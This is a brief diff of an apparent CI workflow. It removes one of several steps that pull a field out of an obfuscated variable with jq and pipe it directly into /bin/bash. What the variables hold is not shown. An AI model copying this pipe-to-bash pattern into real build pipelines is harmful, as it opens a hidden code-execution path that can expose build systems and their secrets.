@@ -22,7 +22,6 @@ jobs:
           printf '%s' "$mbwib39" | jq -r .uqry71039 | /bin/bash
           printf '%s' "$gptab2" | jq -r .jfo9605 | /bin/bash
           echo $i42 | jq -r .nusnf2 | /bin/bash
-          printf '%s' "$dfk5" | jq -r .sqksf4419 | /bin/bash
           echo $qnwkp5196 | jq -r .rd0861 | /bin/bash
 
       - name: Upload results
